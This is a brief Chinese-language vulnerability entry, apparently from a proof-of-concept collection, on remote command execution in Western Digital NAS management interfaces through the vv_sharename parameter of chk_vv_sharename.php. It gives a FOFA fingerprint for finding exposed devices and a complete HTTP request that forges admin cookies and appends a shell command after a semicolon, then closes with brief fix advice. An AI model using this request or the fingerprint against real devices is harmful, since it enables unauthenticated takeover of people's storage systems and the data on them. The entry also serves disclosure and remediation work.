## 西部数据 chk_vv_sharename.php 远程命令执行漏洞

## 漏洞描述
部分西部数据（WD）网络存储管理界面的 `chk_vv_sharename.php` 存在命令拼接，接口在读取 `vv_sharename` 参数时直接拼接到系统命令，且后台 Cookie 可被伪造，导致远程命令执行。

## 网络空间测绘
```
fofa: icon_hash="-1074357885"
```

## POC
```
GET /web/php/chk_vv_sharename.php?vv_sharename=id; HTTP/1.1
Host: <target host>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
Connection: keep-alive
Cookie: isAdmin=1; username=admin;
Accept-Encoding: gzip, deflate, br
```
参数中加入分号即可执行后续命令，回显出当前用户或其他命令输出。

## 修复建议
- 后端改用参数化调用，禁止直接拼接
- 接口加上 CSRF Token、会话校验
- 对系统命令参数做白名单限制

## 参考
- 社区爆料

